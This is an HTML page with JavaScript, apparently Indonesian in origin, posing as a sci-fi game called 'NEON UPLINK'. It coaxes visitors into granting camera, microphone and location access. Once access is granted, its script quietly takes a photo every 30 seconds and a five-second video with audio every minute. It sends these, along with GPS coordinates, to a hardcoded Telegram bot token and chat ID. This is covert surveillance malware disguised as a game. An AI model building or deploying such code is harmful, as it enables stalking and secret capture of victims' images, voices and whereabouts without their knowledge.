<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🛰️ NEON UPLINK v3.1</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
  body {
    background: #05050a;
    color: #00f3ff;
    font-family: 'Share Tech Mono', monospace;
    overflow: hidden;
    height: 100vh;
    width: 100vw;
  }
  #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
  .scanlines {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 3px);
    pointer-events: none; z-index: 10; opacity: 0.4;
  }
  .vignette {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: radial-gradient(circle, transparent 40%, #000 100%);
    pointer-events: none; z-index: 9;
  }

  /* === SPLASH / PERMISSION SCREEN === */
  #splashScreen {
    position: fixed; inset: 0; z-index: 100;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    background: #000;
    padding: 20px;
    transition: opacity 0.5s;
  }
  #splashScreen.hide { opacity: 0; pointer-events: none; }

  .splash-logo {
    font-size: 3.5rem; margin-bottom: 10px;
    text-shadow: 0 0 20px #00f3ff;
    animation: float 3s ease-in-out infinite;
  }
  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
  }
  .splash-title {
    font-size: 2rem; color: #00f3ff;
    text-shadow: 0 0 15px #00f3ff;
    margin-bottom: 5px;
    letter-spacing: 3px;
  }
  .splash-sub {
    color: #666; font-size: 0.8rem; margin-bottom: 30px;
    letter-spacing: 2px;
  }

  .progress-bar {
    width: 100%; max-width: 400px;
    height: 4px; background: #1a1a2e;
    border-radius: 2px; margin-bottom: 30px;
    overflow: hidden;
  }
  .progress-fill {
    height: 100%; background: linear-gradient(90deg, #00f3ff, #ff00ff);
    width: 0%; transition: width 0.5s ease;
    box-shadow: 0 0 10px #00f3ff;
  }

  .perm-card {
    width: 100%; max-width: 400px;
    background: #0a0f1a; border: 2px solid #333;
    border-radius: 12px; padding: 20px;
    margin-bottom: 20px;
    transition: all 0.3s;
    position: relative;
    overflow: hidden;
  }
  .perm-card.active {
    border-color: #00f3ff;
    box-shadow: 0 0 30px #00f3ff40;
    transform: scale(1.02);
  }
  .perm-card.completed {
    border-color: #00ff88;
    opacity: 0.6;
  }
  .perm-card::before {
    content: '';
    position: absolute;
    top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0,243,255,0.1), transparent);
    transition: left 0.5s;
  }
  .perm-card.active::before { left: 100%; }

  .perm-header {
    display: flex; align-items: center; justify-content: space-between;
    margin-bottom: 10px;
  }
  .perm-icon-box {
    display: flex; align-items: center; gap: 12px;
  }
  .perm-icon {
    font-size: 2rem;
    filter: grayscale(100%);
    transition: 0.3s;
  }
  .perm-card.active .perm-icon {
    filter: grayscale(0%);
    text-shadow: 0 0 15px currentColor;
  }
  .perm-card.completed .perm-icon { filter: grayscale(0%); }
  
  .perm-title { font-size: 1.1rem; letter-spacing: 2px; }
  .perm-desc { color: #666; font-size: 0.8rem; margin-top: 3px; }
  
  .perm-badge {
    padding: 5px 12px; border-radius: 4px;
    font-size: 0.75rem; font-weight: bold;
    background: #222; color: #666;
    border: 1px solid #333;
  }
  .perm-card.active .perm-badge {
    background: #00f3ff20; color: #00f3ff;
    border-color: #00f3ff;
    animation: pulse 1s infinite;
  }
  .perm-card.completed .perm-badge {
    background: #00ff8820; color: #00ff88;
    border-color: #00ff88;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.5; }
  }

  .step-indicator {
    text-align: center; color: #666;
    font-size: 0.85rem; margin-bottom: 25px;
    letter-spacing: 1px;
  }
  .step-indicator span {
    color: #00f3ff; font-weight: bold;
  }

  #actionBtn {
    padding: 15px 50px; font-size: 1rem; font-family: inherit;
    background: transparent; border: 2px solid #00f3ff; color: #00f3ff;
    cursor: pointer; letter-spacing: 3px;
    box-shadow: 0 0 20px #00f3ff40;
    transition: 0.3s;
    text-transform: uppercase;
  }
  #actionBtn:hover:not(:disabled) {
    background: #00f3ff20;
    transform: scale(1.05);
    box-shadow: 0 0 30px #00f3ff60;
  }
  #actionBtn:disabled {
    opacity: 0.3; cursor: wait;
  }
  #actionBtn.complete {
    border-color: #00ff88; color: #00ff88;
    box-shadow: 0 0 30px #00ff8860;
    animation: glow 1.5s infinite;
  }
  @keyframes glow {
    0%, 100% { box-shadow: 0 0 20px #00ff8860; }
    50% { box-shadow: 0 0 40px #00ff88; }
  }

  .status-text {
    margin-top: 15px; color: #666;
    font-size: 0.8rem; text-align: center;
    min-height: 20px;
  }

  /* === MAIN UI === */
  #mainUI {
    position: relative; z-index: 5;
    display: none; flex-direction: column; height: 100vh; padding: 15px;
    opacity: 0; transition: opacity 0.8s;
  }
  #mainUI.show { display: flex; opacity: 1; }

  .hud-top { display: flex; justify-content: space-between; margin-bottom: 10px; gap: 10px; }
  .panel {
    background: #0a0f1a90; border: 1px solid #00f3ff50;
    padding: 8px 12px; border-radius: 6px;
    backdrop-filter: blur(4px);
    font-size: 0.85rem; flex: 1; text-align: center;
  }
  .blink { animation: blink 1s infinite; color: #00ff88; }
  @keyframes blink { 50% { opacity: 0.3; } }

  .hud-center {
    flex: 1; display: flex; align-items: center; justify-content: center;
    position: relative; margin: 10px 0;
  }
  #video {
    width: 100%; max-width: 500px; height: auto;
    border: 2px solid #b026ff; border-radius: 8px;
    background: #000; box-shadow: 0 0 25px #b026ff60;
    transform: scaleX(-1);
  }
  .rec-indicator {
    position: absolute; top: 10px; right: 10px;
    background: #ff000080; color: #fff; padding: 4px 10px;
    border-radius: 4px; font-weight: bold; font-size: 0.8rem;
    animation: pulseRec 1.5s infinite;
  }
  @keyframes pulseRec { 50% { box-shadow: 0 0 20px red; } }

  .hud-bottom { margin-top: auto; }
  .log-panel {
    height: 110px; overflow-y: auto; font-size: 0.72rem;
    color: #0f0; line-height: 1.4;
    background: #0a0f1a90; border: 1px solid #00f3ff40;
    padding: 10px; border-radius: 6px;
  }
  .log-panel::-webkit-scrollbar { width: 6px; }
  .log-panel::-webkit-scrollbar-thumb { background: #00f3ff; border-radius: 3px; }

  .countdown {
    position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
    font-size: 1.1rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff;
    background: #00000080; padding: 4px 12px; border-radius: 4px;
  }
</style>
</head>
<body>
<canvas id="starfield"></canvas>
<div class="scanlines"></div>
<div class="vignette"></div>

<!-- ============ SPLASH / PERMISSION SCREEN ============ -->
<div id="splashScreen">
  <div class="splash-logo">🛰️</div>
  <div class="splash-title">NEON UPLINK</div>
  <div class="splash-sub">v3.1 // SECURE TRANSMISSION</div>

  <div class="progress-bar">
    <div class="progress-fill" id="progressFill"></div>
  </div>

  <div class="step-indicator">
    STEP <span id="currentStep">1</span> OF <span id="totalSteps">3</span>
  </div>

  <!-- Camera Permission -->
  <div class="perm-card active" id="cardCam">
    <div class="perm-header">
      <div class="perm-icon-box">
        <div class="perm-icon">📷</div>
        <div>
          <div class="perm-title" style="color: #00f3ff;">CAMERA</div>
          <div class="perm-desc">Visual transmission</div>
        </div>
      </div>
      <div class="perm-badge" id="badgeCam">WAITING</div>
    </div>
  </div>

  <!-- Location Permission -->
  <div class="perm-card" id="cardLoc">
    <div class="perm-header">
      <div class="perm-icon-box">
        <div class="perm-icon">📍</div>
        <div>
          <div class="perm-title" style="color: #ff00ff;">LOCATION</div>
          <div class="perm-desc">GPS coordinates</div>
        </div>
      </div>
      <div class="perm-badge" id="badgeLoc">PENDING</div>
    </div>
  </div>

  <!-- Microphone Permission -->
  <div class="perm-card" id="cardMic">
    <div class="perm-header">
      <div class="perm-icon-box">
        <div class="perm-icon">🎤</div>
        <div>
          <div class="perm-title" style="color: #00ff88;">MICROPHONE</div>
          <div class="perm-desc">Audio recording</div>
        </div>
      </div>
      <div class="perm-badge" id="badgeMic">PENDING</div>
    </div>
  </div>

  <button id="actionBtn">INITIALIZE</button>
  <div class="status-text" id="statusText">Tap to begin permission sequence</div>
</div>

<!-- ============ MAIN GAME UI ============ -->
<div id="mainUI">
  <div class="hud-top">
    <div class="panel">STATUS: <span class="blink">ONLINE</span></div>
    <div class="panel" id="txPanel">NEXT TX: --s</div>
  </div>
  <div class="hud-center">
    <video id="video" autoplay muted playsinline></video>
    <div class="rec-indicator">● REC</div>
    <div class="countdown" id="countdown">UPLINK ACTIVE</div>
  </div>
  <div class="hud-bottom">
    <div class="log-panel" id="logBox">&gt; SYSTEM ONLINE...</div>
  </div>
</div>

<canvas id="photoCanvas" style="display:none;"></canvas>

<script>
// ============================================
// ⚙️ KONFIGURASI (GANTI SESUAI PUNYA KAMU) ⚙️
// ============================================
const BOT_TOKEN = "7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE";
const CHAT_ID   = "7223902938";
// ============================================

let stream, mediaRecorder, chunks = [];
let nextPhotoTime = 0, nextVideoTime = 0;
let currentStep = 0;
const steps = ['cam', 'loc', 'mic'];

const video = document.getElementById('video');
const canvas = document.getElementById('photoCanvas');
const logBox = document.getElementById('logBox');
const txPanel = document.getElementById('txPanel');
const countdownEl = document.getElementById('countdown');
const splash = document.getElementById('splashScreen');
const mainUI = document.getElementById('mainUI');
const actionBtn = document.getElementById('actionBtn');
const statusText = document.getElementById('statusText');
const progressFill = document.getElementById('progressFill');
const currentStepEl = document.getElementById('currentStep');

function setBadge(id, text, color = '') {
  const badge = document.getElementById('badge' + id.toUpperCase());
  badge.textContent = text;
  if (color) badge.style.color = color;
}

function activateCard(id) {
  document.querySelectorAll('.perm-card').forEach(c => c.classList.remove('active'));
  document.getElementById('card' + id.toUpperCase()).classList.add('active');
}

function completeCard(id) {
  document.getElementById('card' + id.toUpperCase()).classList.add('completed');
  document.getElementById('card' + id.toUpperCase()).classList.remove('active');
  setBadge(id, 'GRANTED', '#00ff88');
}

function updateProgress() {
  const pct = ((currentStep) / steps.length) * 100;
  progressFill.style.width = pct + '%';
  currentStepEl.textContent = currentStep + 1;
}

// --- SEQUENTIAL PERMISSION REQUEST ---
async function requestNextPermission() {
  if (currentStep >= steps.length) {
    // All done
    actionBtn.textContent = '✓ ACCESS GRANTED';
    actionBtn.classList.add('complete');
    actionBtn.disabled = true;
    statusText.textContent = 'Entering system...';
    setTimeout(enterMain, 1000);
    return;
  }

  const perm = steps[currentStep];
  activateCard(perm);
  setBadge(perm, 'REQUESTING...', '#00f3ff');
  actionBtn.disabled = true;
  statusText.textContent = `Granting ${perm.toUpperCase()} permission...`;

  try {
    if (perm === 'cam') {
      // Request Camera + Mic together (browser requirement)
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'environment', width: { ideal: 1280 } },
        audio: true
      });
      video.srcObject = stream;
      completeCard('cam');
      // Mic is also granted with camera, so complete it too
      setTimeout(() => {
        completeCard('mic');
        currentStep = 2; // Skip mic step
        updateProgress();
      }, 300);
      
    } else if (perm === 'loc') {
      if (!navigator.geolocation) throw new Error('Geolocation not supported');
      await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            log(`> GPS ACQUIRED: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);
            resolve(pos);
          },
          reject,
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      });
      completeCard('loc');
      
    } else if (perm === 'mic') {
      // Already granted with camera, skip
      completeCard('mic');
    }

    currentStep++;
    updateProgress();
    actionBtn.disabled = false;
    
    if (currentStep < steps.length) {
      statusText.textContent = `Tap to continue to ${steps[currentStep].toUpperCase()}`;
      actionBtn.textContent = 'CONTINUE';
    } else {
      // All done
      requestNextPermission();
    }

  } catch (err) {
    setBadge(perm, 'DENIED', '#ff3366');
    statusText.textContent = `Permission denied. Tap to retry.`;
    actionBtn.disabled = false;
    actionBtn.textContent = 'RETRY';
    log(`> PERMISSION DENIED: ${perm} - ${err.message}`);
  }
}

actionBtn.onclick = () => {
  if (currentStep === 0 && actionBtn.textContent === 'INITIALIZE') {
    log('> INITIALIZING PERMISSION SEQUENCE...');
  }
  requestNextPermission();
};

// --- Enter Main UI ---
function enterMain() {
  splash.classList.add('hide');
  setTimeout(() => {
    splash.style.display = 'none';
    mainUI.classList.add('show');
    startUplink();
  }, 500);
}

// --- Starfield Background ---
const starCanvas = document.getElementById('starfield');
const sctx = starCanvas.getContext('2d');
let stars = [];
function resizeStar() { starCanvas.width = innerWidth; starCanvas.height = innerHeight; }
addEventListener('resize', resizeStar);
resizeStar();
for(let i=0; i<150; i++) stars.push({
  x: Math.random()*starCanvas.width,
  y: Math.random()*starCanvas.height,
  z: Math.random()*2,
  speed: Math.random()*0.5 + 0.1
});
function animateStars() {
  sctx.fillStyle = '#05050a';
  sctx.fillRect(0, 0, starCanvas.width, starCanvas.height);
  sctx.fillStyle = '#00f3ff';
  stars.forEach(s => {
    sctx.globalAlpha = s.z;
    sctx.beginPath();
    sctx.arc(s.x, s.y, s.z * 1.5, 0, Math.PI*2);
    sctx.fill();
    s.y += s.speed;
    if(s.y > starCanvas.height) { s.y = 0; s.x = Math.random()*starCanvas.width; }
  });
  requestAnimationFrame(animateStars);
}
animateStars();

// --- Core Functions ---
function log(msg) {
  const time = new Date().toLocaleTimeString();
  const p = document.createElement('div');
  p.innerHTML = `[${time}] ${msg}`;
  logBox.prepend(p);
  if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
}

function takePhoto() {
  if (!stream) return;
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.8);
}

async function sendPhoto(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'u_photo.jpg');
  fd.append('caption', `📸 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ PHOTO SENT' : `❌ PHOTO: ${d.description}`);
  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
}

function startRecording() {
  if (!stream) return;
  chunks = [];
  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'video/webm' });
    sendVideo(blob);
  };
  mediaRecorder.start();
  log('🎥 RECORDING 5s...');
  setTimeout(() => {
    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
  }, 5000);
}

async function sendVideo(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', blob, 'u_video.webm');
  fd.append('caption', `🎥 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ VIDEO SENT' : `❌ VIDEO: ${d.description}`);
  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
}

function sendLocation() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(async pos => {
    const { latitude, longitude, accuracy } = pos.coords;
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude, horizontal_accuracy: accuracy })
      });
      const d = await res.json();
      log(d.ok ? `✅ LOC: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}` : `❌ LOC: ${d.description}`);
    } catch(e) { log(`❌ NET ERR: ${e.message}`); }
  }, err => log(`❌ LOC ERR: ${err.message}`), { enableHighAccuracy: true, timeout: 5000 });
}

function updateTimers() {
  const now = Date.now();
  const nextPhoto = Math.max(0, Math.ceil((nextPhotoTime - now)/1000));
  const nextVideo = Math.max(0, Math.ceil((nextVideoTime - now)/1000));
  const next = Math.min(nextPhoto, nextVideo);
  txPanel.textContent = `NEXT TX: ${next}s`;
  countdownEl.textContent = `UPLINK CYCLE: ${next}s`;

  if (now >= nextPhotoTime) { takePhoto(); nextPhotoTime = now + 30000; }
  if (now >= nextVideoTime) { startRecording(); sendLocation(); nextVideoTime = now + 60000; }
  requestAnimationFrame(updateTimers);
}

function startUplink() {
  log('> ALL PERMISSIONS GRANTED');
  log('> UPLINK SEQUENCE STARTED');
  nextPhotoTime = Date.now() + 2000;
  nextVideoTime = Date.now() + 5000;
  updateTimers();
}

// --- Security check ---
if (BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
  statusText.textContent = '⚠️ EDIT TOKEN & ID FIRST';
  actionBtn.onclick = () => alert('Open this file in text editor, replace BOT_TOKEN & CHAT_ID at top of script, then save & refresh.');
}
</script>
</body>
</html>
